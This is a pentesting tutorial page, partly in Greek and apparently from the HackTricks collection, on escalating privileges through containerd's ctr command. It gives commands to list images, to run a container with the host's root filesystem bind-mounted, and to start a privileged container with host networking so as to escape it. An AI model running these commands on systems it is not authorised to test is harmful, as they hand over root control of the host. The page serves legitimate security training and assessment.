# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Go to the following link to learn **what is containerd** and `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

if you find that a host contains the `ctr` command:
```bash
which ctr
/usr/bin/ctr
```
Μπορείτε να καταγράψετε τις εικόνες:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Και στη συνέχεια **τρέξτε μία από αυτές τις εικόνες, προσαρτώντας τον φάκελο ρίζας του host σε αυτήν**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Τρέξτε ένα container με προνόμια και ξεφύγετε από αυτό.\
Μπορείτε να τρέξετε ένα privileged container ως:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Μπορείτε να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην παρακάτω σελίδα για να **διαφύγετε από αυτό εκμεταλλευόμενοι τις προνομιακές δυνατότητες**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
